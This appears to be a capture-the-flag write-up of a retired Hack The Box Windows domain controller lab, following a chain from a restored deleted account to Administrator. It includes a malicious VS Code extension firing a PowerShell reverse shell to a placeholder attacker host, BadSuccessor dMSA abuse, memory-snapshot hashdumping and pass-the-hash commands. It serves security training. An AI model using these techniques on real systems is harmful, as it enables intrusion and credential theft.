<!--META
machine: Checkpoint
os: Windows Server 2025
difficulty: Medium
status: Retired
tagline: AD Recycle Bin to Root — Supply Chain and Memory Forensics
stages: 8
cves: 1
access: ROOT
-->

# Checkpoint — Hack The Box (Windows, Medium)

**AD Recycle Bin to Root — A Full Chain Compromise**

| | |
|---|---|
| **Target** | `DC01.checkpoint.htb` |
| **Difficulty** | Medium |
| **Operating System** | Windows Server 2025 |
| **Initial Vector** | AD Recycle Bin revive → malicious VS Code extension (supply chain) |
| **Escalation Vector** | BadSuccessor (CVE-2025-53779) dMSA abuse |
| **Final Vector** | VM memory snapshot → Volatility hashdump → pass-the-hash |
| **Final Privilege** | `Administrator` |

> All flags, credentials, hashes and IP addresses in this writeup are redacted. The methodology is complete; the values are not.

---

## Table of Contents

1. [Executive Summary](#1--executive-summary)
2. [Reconnaissance](#2--reconnaissance)
3. [Enumerating alex.turner's Rights](#3--enumerating-alexturners-rights)
4. [Reviving mark.davies (AD Recycle Bin)](#4--reviving-markdavies-ad-recycle-bin)
5. [Supply-Chain RCE via a Malicious Extension](#5--supply-chain-rce-via-a-malicious-extension)
6. [ryan.brooks to svc_deploy (BadSuccessor)](#6--ryanbrooks-to-svc_deploy-badsuccessor)
7. [svc_deploy to Administrator via Memory Forensics](#7--svc_deploy-to-administrator-via-memory-forensics)
8. [Chain Summary and Conclusions](#8--chain-summary-and-conclusions)

---

## 1 — Executive Summary

Checkpoint is a Medium-rated Windows Server 2025 Domain Controller. With assumed-breach credentials, the Reanimate-Tombstones right revives a deleted user whose password is reused, granting a writable SMB share. That share auto-installs VS Code extensions, so a malicious `.vsix` gives supply-chain RCE as a developer. BadSuccessor (CVE-2025-53779) abuses a delegated-MSA to steal a service account's hash, which unlocks a VM memory snapshot; a Volatility hashdump then yields the Administrator hash for a pass-the-hash to root.

### Attack chain overview

1. Reconnaissance: a standard DC, with the MTU and clock-skew gotchas fixed first.
2. `bloodyAD get writable` surfaces Reanimate-Tombstones and a dMSA create right.
3. Restore the deleted `mark.davies`; password reuse grants a writable share.
4. Malicious `.vsix` auto-installed → RCE as `ryan.brooks` (user flag).
5. BadSuccessor dMSA abuse → `svc_deploy` NT hash.
6. `svc_deploy` reads the VMBackups share; Volatility hashdump → Administrator hash.
7. Pass-the-hash as Administrator → root flag.

---

## 2 — Reconnaissance

### Pitfall

The VPN path MTU to this box is ~1300, so large Kerberos/SMB packets are silently dropped — set `sudo ip link set dev tun0 mtu 1300` first. The DC clock runs ~7h ahead and RC4 is disabled, so authenticate with the password (produces AES) and keep `faketime` handy.

```bash
nmap -sC -sV -oN checkpoint_initial.txt <TARGET_IP>
```

```
88/tcp   kerberos-sec  53/tcp domain  389/tcp ldap (checkpoint.htb)  445/tcp smb  5985/tcp WinRM
|_clock-skew: 7h00m04s
```

```bash
echo "<TARGET_IP> checkpoint.htb dc01.checkpoint.htb DC01" | sudo tee -a /etc/hosts
nxc smb <TARGET_IP> -d checkpoint.htb -u alex.turner -p '<REDACTED>'
```

---

## 3 — Enumerating alex.turner's Rights

```bash
bloodyAD --host <TARGET_IP> -d checkpoint.htb -u alex.turner -p '<REDACTED>' get writable
```

### Key observation

Alex holds three unusual rights: **Reanimate-Tombstones** on `CN=Deleted Objects`, **CREATE_CHILD** for dMSA on `OU=Employees`, and **WRITE** on the tombstone of `CN=Mark Davies`. Reanimate-Tombstones lets a non-admin restore deleted AD objects — and a deleted user brought back keeps its old attributes, so a reused password is instantly usable.

---

## 4 — Reviving mark.davies (AD Recycle Bin)

```bash
bloodyAD --host <TARGET_IP> -d checkpoint.htb -u alex.turner -p '<REDACTED>' \
  set restore 'CN=Mark Davies\0ADEL:2217e877-...'
nxc smb <TARGET_IP> -u mark.davies -p '<REDACTED>' --shares
```

```
DevDrop     READ,WRITE     (VS Code extensions, engine 1.118.0)
VMBackups   (visible, not yet accessible)
```

---

## 5 — Supply-Chain RCE via a Malicious Extension

`DevDrop` holds VS Code extensions, and a scheduled `vscodesync.ps1` on the DC auto-installs whatever lands there.

### Vulnerability confirmed

An editor extension is arbitrary code that runs in the context of whoever opens the editor. A writable extension drop processed by an automated install is a supply-chain foothold — a `.vsix` whose `extension.js` fires a PowerShell reverse shell on startup:

```javascript
activationEvents: ["onStartupFinished"]
// payload: powershell -enc <reverse shell to <ATTACKER_IP>:4444>
```

```bash
smbclient //<TARGET_IP>/DevDrop -U mark.davies%'<REDACTED>' -c 'put dev-utils.vsix'
```

After ~2 minutes the sync script installs it and the shell returns as `ryan.brooks`:

```
whoami
checkpoint\ryan.brooks
type C:\Users\ryan.brooks\Desktop\user.txt
```

```
<USER_FLAG_REDACTED>
```

---

## 6 — ryan.brooks to svc_deploy (BadSuccessor)

### CVE-2025-53779 (BadSuccessor)

`ryan.brooks` has `CreateChild` on an OU that permits delegated MSAs. BadSuccessor abuses a delegated-MSA (dMSA) made to "supersede" a target account, inheriting its credentials. From ryan's shell, obtain a Kerberos ticket and run the dMSA attack (SharpSuccessor / evil-dmsa):

```powershell
.\Rubeus.exe tgtdeleg /nowrap          # TGT for ryan, base64
```

```bash
impacket-ticketConverter ryan.kirbi ryan.ccache
# create the dMSA superseding svc_deploy, then request its ticket/keys
```

This yields the NT hash of `svc_deploy`.

---

## 7 — svc_deploy to Administrator via Memory Forensics

`svc_deploy` can read the `VMBackups` share. Pass-the-hash and pull the snapshot:

```bash
smbclient //<TARGET_IP>/VMBackups -U svc_deploy --pw-nt-hash <REDACTED> \
  -c 'get "Windows Server 2019-Snapshot1.vmem"'        # ~2 GB
```

### Vulnerability confirmed

A VM memory snapshot contains the live LSASS secrets. Treating the `.vmem` as a memory image and running a hashdump extracts the local Administrator NT hash offline — no code execution on the DC needed:

```bash
vol3 -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump
# Administrator :: <REDACTED>
evil-winrm -i <TARGET_IP> -u Administrator -H <REDACTED>
type C:\Users\max.palmer\Desktop\root.txt
```

### Pitfall

The root flag is on `max.palmer`'s Desktop, not `Administrator`'s — don't assume the default path.

```
<ROOT_FLAG_REDACTED>
```

---

## 8 — Chain Summary and Conclusions

| # | Stage | Technique | Result |
|---|---|---|---|
| 1 | Reconnaissance | Nmap + bloodyAD | Reanimate-Tombstones right |
| 2 | AD recycle bin | `set restore` | `mark.davies` revived |
| 3 | Share access | Password reuse | Writable `DevDrop` |
| 4 | Supply-chain RCE | Malicious `.vsix` | Shell as `ryan.brooks` (user) |
| 5 | Delegation abuse | BadSuccessor (CVE-2025-53779) | `svc_deploy` NT hash |
| 6 | Memory forensics | VMBackups + Volatility | Administrator hash |
| 7 | Privilege escalation | Pass-the-hash | Root flag |

### Closing thoughts

Checkpoint rewards fixing the plumbing before the attack — the MTU black hole and 7h clock skew would silently break Kerberos. The first real question in AD is "what can I write?", and `bloodyAD get writable` surfaced a right most enumeration overlooks. From there every stage is a trust abuse: a revived tombstone is a live account, an editor extension is code execution, and a VM snapshot is LSASS on disk — with the root flag deliberately misplaced on another user's Desktop.

### Key takeaways

- Fix the plumbing before the attack — MTU and clock skew first.
- "What can I write?" is the first AD question — `bloodyAD get writable`.
- A revived tombstone is a live account with a reused password.
- An editor extension is code execution; a writable extension drop is supply-chain RCE.
- A VM snapshot is LSASS on disk; the root flag sat on a different user's Desktop.

---

*Writeup by Leandro Ancona — Offensive Security Practitioner, eJPT Certified.*
